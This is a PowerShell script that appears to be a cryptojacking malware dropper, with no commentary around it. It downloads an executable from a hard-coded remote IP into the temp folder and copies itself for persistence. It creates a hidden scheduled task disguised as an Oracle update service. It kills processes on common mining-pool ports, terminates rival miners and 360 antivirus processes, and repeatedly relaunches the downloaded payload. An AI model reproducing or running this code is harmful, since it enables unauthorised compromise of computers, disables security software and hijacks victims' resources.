$ne = $MyInvocation.MyCommand.Path
$nurl = "http://205.185.116.78/pythonhs.exe"
$noutput = "$env:TMP\kkrr.exe"
$vc = New-Object System.Net.WebClient
$vc.DownloadFile($nurl,$noutput)
copy $ne $HOME\kkwx.ps1
copy $env:TMP\kkrr.exe $env:TMP\kkrrr.exe
Get-Process -Id (Get-NetTCPConnection -RemotePort 3333).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 4444).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 5555).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 7777).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 14444).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 5790).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 45700).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 2222).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 9999).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 20580).OwningProcess | Stop-Process -Force
Get-Process -Id (Get-NetTCPConnection -RemotePort 13531).OwningProcess | Stop-Process -Force

SchTasks.exe /Create /SC MINUTE /TN "Update service for Oracle productsm" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noexit -File $HOME\kkwxr.ps1" /MO 6 /F
SchTasks.exe /Delete /TN "Update service for Oracle products" /F
SchTasks.exe /Delete /TN "Update service for Oracle products5" /F
SchTasks.exe /Delete /TN "Update service for Oracle products1" /F
SchTasks.exe /Delete /TN "Update service for Oracle products2" /F
SchTasks.exe /Delete /TN "Update service for Oracle products3" /F
SchTasks.exe /Delete /TN "Update service for Oracle products4" /F
SchTasks.exe /Delete /TN "Update service for Oracle products7" /F
SchTasks.exe /Delete /TN "Update service for Oracle products8" /F
SchTasks.exe /Delete /TN "Update service for Oracle products0" /F
SchTasks.exe /Delete /TN "Update service for Oracle products9" /F
SchTasks.exe /Delete /TN "Update service for Oracle productsa" /F
SchTasks.exe /Delete /TN "Update service for Oracle productsc" /F
SchTasks.exe /Delete /TN "Update service for Oracle productsm" /F

while ($true) {
	if(!(Get-Process pythonhs.exe -ErrorAction SilentlyContinue)) {
		echo "Not running"
    cmd.exe /C taskkill /IM ddg.exe /f
    cmd.exe /C taskkill /IM yam.exe /f
    cmd.exe /C taskkill /IM miner.exe /f
    cmd.exe /C taskkill /IM xmrig.exe /f
    cmd.exe /C taskkill /IM nscpucnminer32.exe /f
    cmd.exe /C taskkill /IM 1e.exe /f
    cmd.exe /C taskkill /IM iie.exe /f
    cmd.exe /C taskkill /IM 3.exe /f
    cmd.exe /C taskkill /IM iee.exe /f
    cmd.exe /C taskkill /IM ie.exe /f
    cmd.exe /C taskkill /IM je.exe /f
    cmd.exe /C taskkill /IM im360sd.exe /f
    cmd.exe /C taskkill /IM iexplorer.exe /f
    cmd.exe /C taskkill /IM imzhudongfangyu.exe /f
    cmd.exe /C taskkill /IM 360tray.exe /f
    cmd.exe /C taskkill /IM 360rp.exe /f
    cmd.exe /C taskkill /IM 360rps.exe /f
    cmd.exe /C taskkill /IM pe.exe /f
    cmd.exe /C taskkill /IM me.exe /f
    cmd.exe /C taskkill /IM te.exe /f
    cmd.exe /C taskkill /IM ready.exe /f
		cmd.exe /C $env:TMP\kkrrr.exe
	} else {
		echo "Running"
	}
	Start-Sleep 30
}		